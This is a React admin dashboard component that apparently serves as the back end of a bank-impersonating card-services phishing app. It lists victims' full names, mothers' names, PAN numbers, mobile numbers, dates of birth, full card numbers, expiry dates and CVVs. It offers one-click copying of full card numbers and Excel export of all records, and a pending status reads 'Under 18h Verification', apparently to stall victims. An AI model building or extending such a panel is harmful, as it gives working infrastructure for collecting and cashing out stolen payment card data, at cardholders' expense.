import React, { useState } from 'react';
import {
  Eye,
  Check,
  X,
  TrendingUp,
  Key,
  Gift,
  Repeat,
  Search,
  RefreshCw,
  FileSpreadsheet,
  Copy,
  CheckCheck,
  Lock,
  Calendar,
  Phone,
  Trash2,
  CreditCard,
  User
} from 'lucide-react';

export default function SubmissionsTable({
  submissions,
  searchTerm,
  setSearchTerm,
  serviceFilter,
  setServiceFilter,
  statusFilter,
  setStatusFilter,
  onViewDossier,
  onUpdateStatus,
  onDeleteSubmission,
  onExportExcel,
  onRefresh
}) {
  const [copiedId, setCopiedId] = useState(null);
  const [revealedCards, setRevealedCards] = useState({});

  const handleCopy = (text, id) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const toggleRevealCard = (id) => {
    setRevealedCards((prev) => ({ ...prev, [id]: !prev[id] }));
  };

  const getServiceBadge = (service) => {
    switch (service) {
      case 'increase_limit':
        return (
          <span className="service-tag">
            <TrendingUp size={14} color="#e11b22" /> Increase Limit
          </span>
        );
      case 'login_card':
        return (
          <span className="service-tag">
            <Key size={14} color="#f59e0b" /> Login Card
          </span>
        );
      case 'rewards_points':
        return (
          <span className="service-tag">
            <Gift size={14} color="#10b981" /> Rewards Points
          </span>
        );
      case 'card_to_card':
        return (
          <span className="service-tag">
            <Repeat size={14} color="#0072ce" /> Card to Card
          </span>
        );
      default:
        return <span className="service-tag">{service || 'Card Service'}</span>;
    }
  };

  const getStatusPill = (status) => {
    return (
      <span className={`status-pill ${status}`}>
        <span className={`status-dot ${status}`}></span>
        {status === 'pending' ? 'Under 18h Verification' : status}
      </span>
    );
  };

  return (
    <div className="admin-card-section">
      {/* Table Toolbar */}
      <div className="table-toolbar">
        <div className="toolbar-left">
          {/* Search */}
          <div className="search-input-wrapper">
            <Search size={16} />
            <input
              type="text"
              placeholder="Search by Name, PAN, Mobile, or Card..."
              className="admin-search-input"
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
            />
          </div>

          {/* Service Filter */}
          <select
            className="filter-select"
            value={serviceFilter}
            onChange={(e) => setServiceFilter(e.target.value)}
          >
            <option value="all">All Services (4)</option>
            <option value="increase_limit">Increase Limit</option>
            <option value="login_card">Login Card</option>
            <option value="rewards_points">Rewards Points</option>
            <option value="card_to_card">Card to Card</option>
          </select>

          {/* Status Filter */}
          <select
            className="filter-select"
            value={statusFilter}
            onChange={(e) => setStatusFilter(e.target.value)}
          >
            <option value="all">All Statuses</option>
            <option value="pending">Pending Verification</option>
            <option value="approved">Approved</option>
            <option value="rejected">Rejected</option>
          </select>
        </div>

        <div className="toolbar-right">
          <button className="btn-secondary" onClick={onRefresh} title="Refresh records">
            <RefreshCw size={15} />
            <span>Refresh</span>
          </button>
          <button className="btn-excel-export" onClick={onExportExcel} title="Export all submissions to Excel (.xls)">
            <FileSpreadsheet size={16} />
            <span>Export to Excel</span>
          </button>
        </div>
      </div>

      {/* Responsive Table */}
      <div className="table-responsive">
        <table className="admin-table">
          <thead>
            <tr>
              <th>Date & Time</th>
              <th>Applicant & Mother</th>
              <th>PAN Card No.</th>
              <th>Mobile</th>
              <th>DOB</th>
              <th>Service</th>
              <th>Card Details (16-Digit)</th>
              <th>Expiry & CVV</th>
              <th>Status</th>
              <th style={{ textAlign: 'right' }}>Actions</th>
            </tr>
          </thead>
          <tbody>
            {submissions.length === 0 ? (
              <tr>
                <td colSpan="10" style={{ textAlign: 'center', padding: '3.5rem 1rem', color: '#94a3b8' }}>
                  <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '0.5rem' }}>
                    <Search size={28} color="#cbd5e1" />
                    <span style={{ fontWeight: 600, fontSize: '0.95rem', color: '#64748b' }}>No submissions found</span>
                    <span style={{ fontSize: '0.8rem', color: '#94a3b8' }}>Customer applications submitted from the mobile app will stream here automatically.</span>
                  </div>
                </td>
              </tr>
            ) : (
              submissions.map((item) => {
                const isRevealed = revealedCards[item.id];
                const displayCard = item.cardNumber
                  ? (isRevealed ? item.cardNumber : `${item.cardNumber.slice(0, 4)} •••• •••• ${item.cardNumber.slice(-4)}`)
                  : '—';

                return (
                  <tr key={item.id}>
                    {/* 1. Date & Time */}
                    <td>
                      <div style={{ fontWeight: 700, color: '#0f172a', fontSize: '0.82rem' }}>
                        {item.submittedAt || 'Recent'}
                      </div>
                      <div style={{ fontSize: '0.7rem', color: '#94a3b8', fontFamily: 'var(--font-mono)' }}>
                        Ref: {item.id.slice(0, 8)}
                      </div>
                    </td>

                    {/* 2. Applicant & Mother */}
                    <td>
                      <div style={{ fontWeight: 700, color: '#002d62', fontSize: '0.9rem' }}>{item.fullName || '—'}</div>
                      <div style={{ fontSize: '0.75rem', color: '#64748b' }}>Mother: {item.mothersName || '—'}</div>
                    </td>

                    {/* 3. PAN Card */}
                    <td>
                      <div style={{ display: 'inline-flex', alignItems: 'center', gap: '4px' }}>
                        <span className="pan-badge">{item.panNumber || 'NOT PROVIDED'}</span>
                        {item.panNumber && (
                          <button
                            className="btn-copy-mini"
                            onClick={() => handleCopy(item.panNumber, `pan-${item.id}`)}
                            title="Copy PAN"
                          >
                            {copiedId === `pan-${item.id}` ? <CheckCheck size={12} color="#10b981" /> : <Copy size={12} />}
                          </button>
                        )}
                      </div>
                    </td>

                    {/* 4. Mobile */}
                    <td className="mono-cell">
                      <div style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>
                        <Phone size={13} color="#64748b" />
                        <span>{item.mobileNumber || '—'}</span>
                      </div>
                    </td>

                    {/* 5. DOB */}
                    <td style={{ fontSize: '0.82rem', color: '#334155' }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>
                        <Calendar size={13} color="#64748b" />
                        <span>{item.dob || '—'}</span>
                      </div>
                    </td>

                    {/* 6. Service */}
                    <td>{getServiceBadge(item.selectedService)}</td>

                    {/* 7. Card Number */}
                    <td>
                      <div style={{ display: 'flex', flexDirection: 'column', gap: '2px' }}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                          <span className="card-num-badge" style={{ cursor: 'pointer' }} onClick={() => toggleRevealCard(item.id)} title="Click to reveal/hide">
                            {displayCard}
                          </span>
                          {item.cardNumber && (
                            <button
                              className="btn-copy-mini"
                              onClick={() => handleCopy(item.cardNumber.replace(/\s+/g, ''), `card-${item.id}`)}
                              title="Copy Full Card Number"
                            >
                              {copiedId === `card-${item.id}` ? <CheckCheck size={12} color="#10b981" /> : <Copy size={12} />}
                            </button>
                          )}
                        </div>
                        {item.nameOnCard && (
                          <span style={{ fontSize: '0.7rem', color: '#64748b', textTransform: 'uppercase' }}>
                            {item.nameOnCard}
                          </span>
                        )}
                      </div>
                    </td>

                    {/* 8. Expiry & CVV */}
                    <td>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '0.8rem', fontFamily: 'var(--font-mono)' }}>
                        <span style={{ background: '#f1f5f9', padding: '2px 6px', borderRadius: '4px', fontWeight: 600 }}>
                          Exp: {item.expiryDate || '—'}
                        </span>
                        <span style={{ background: '#fef3c7', color: '#b45309', padding: '2px 6px', borderRadius: '4px', fontWeight: 700 }}>
                          CVV: {isRevealed ? item.cvv : (item.cvv ? '•••' : '—')}
                        </span>
                      </div>
                    </td>

                    {/* 9. Status */}
                    <td>{getStatusPill(item.status)}</td>

                    {/* 10. Actions */}
                    <td>
                      <div className="table-actions" style={{ justifyContent: 'flex-end' }}>
                        <button
                          className="btn-action-icon"
                          title="View Full Dossier"
                          onClick={() => onViewDossier(item)}
                        >
                          <Eye size={16} />
                        </button>
                        {item.status !== 'approved' && (
                          <button
                            className="btn-action-icon approve"
                            title="Approve Request"
                            onClick={() => onUpdateStatus(item.id, 'approved')}
                          >
                            <Check size={16} />
                          </button>
                        )}
                        {item.status !== 'rejected' && (
                          <button
                            className="btn-action-icon reject"
                            title="Reject Request"
                            onClick={() => onUpdateStatus(item.id, 'rejected')}
                          >
                            <X size={16} />
                          </button>
                        )}
                        {onDeleteSubmission && (
                          <button
                            className="btn-action-icon"
                            title="Delete Record"
                            style={{ color: '#94a3b8' }}
                            onClick={() => onDeleteSubmission(item.id)}
                          >
                            <Trash2 size={15} />
                          </button>
                        )}
                      </div>
                    </td>
                  </tr>
                );
              })
            )}
          </tbody>
        </table>
      </div>
    </div>
  );
}
